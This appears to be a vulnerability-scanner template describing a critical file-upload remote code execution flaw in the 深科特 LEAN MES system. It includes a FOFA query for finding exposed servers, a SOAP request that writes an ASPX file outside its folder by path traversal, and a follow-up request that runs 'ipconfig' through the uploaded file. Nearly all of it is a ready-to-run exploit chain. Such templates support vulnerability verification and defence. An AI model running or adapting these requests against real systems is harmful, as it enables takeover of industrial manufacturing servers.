## id: VEID-2026-11122
## name: 深科特LEAN MES系统 MesATEApi.asmx 文件上传RCE漏洞
## author: hack007x
## severity: critical
## tags: veid,rce,veid2026
## description: 深科特LEAN MES系统 MesATEApi.asmx 文件上传RCE漏洞，攻击者可通过上传恶意文件导致服务器被控制。
## affects: 深科特LEAN MES系统
## fofa-query: title="LEAN MES - 用户登录" || body="Content/js/skt.utility.checkmobile.js" || body="../MobileApp/VerifyError.aspx" || body="Content/login/login2/multiplant_top.png"
## verification: true



POST /WebService/MesATEApi.asmx HTTP/1.1
Host: {{Hostname}}
User-Agent: {{random_ua}}
Content-Type: text/xml; charset=utf-8
SOAPAction: "http://mesateapi.com/UploadFileToMES"

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <UploadFileToMES xmlns="http://mesateapi.com/">
      <empNo>string</empNo>
      <sn>string</sn>
      <resource>string</resource>
      <station>string</station>
      <fileBytes></fileBytes>
      <folderName>/../ertyui</folderName>
      <fileName>veil.aspx</fileName>
    </UploadFileToMES>
  </soap:Body>
</soap:Envelope>


#@ matcher: status_code == 200

---

GET /ertyui/veil.aspx?cmd=ipconfig HTTP/1.1
Host: {{Hostname}}
User-Agent: {{random_ua}}


#@ condition: and
#@ matcher: header["Content-Type"] contains "html" 
#@ matcher: body contains "Windows IP" && body contains "子网掩码"
#@ matcher: status_code == 200








